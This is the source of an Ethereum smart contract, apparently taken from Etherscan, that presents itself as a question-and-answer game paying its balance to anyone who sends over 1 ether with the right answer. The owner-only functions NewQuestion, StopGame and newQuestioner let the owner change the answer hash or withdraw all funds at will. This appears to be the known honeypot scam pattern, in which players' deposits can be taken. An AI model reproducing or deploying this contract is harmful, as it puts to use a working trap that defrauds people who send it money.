/**
 * Source Code first verified at https://etherscan.io on Saturday, March 23, 2019
 (UTC) */

contract quest_question
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);

        if( responseHash == keccak256(_response) && msg.value > 1 ether )
        {
            msg.sender.transfer(this.balance);
        }
    }

    string public question;

    address questionSender;

    bytes32 responseHash;

    bytes32 questionerPin = 0x6ff4ddec09f63c2ffc18cd09c138315a9d8576220c788d9677757addf0834cdf;

    function Activate(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }

    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }

    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }

    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }

    function() public payable{}
}